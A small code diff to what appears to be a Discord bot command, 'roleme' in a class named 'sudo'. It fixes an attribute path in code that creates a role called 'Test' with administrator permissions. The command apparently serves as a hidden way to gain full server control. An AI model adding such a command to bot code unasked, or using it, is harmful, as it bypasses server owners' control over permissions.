@@ -14,7 +14,7 @@ class sudo:
     async def roleme(self, ctx):
         guild = ctx.guild
         role_name = "Test"
-        role_permissions = guild.server.default_role
+        role_permissions = guild.default_role
         role_permissions = role_permissions.permissions
         role_permissions.administrator = True
         await guild.create_role(name=role_name, permissions=role_permissions)
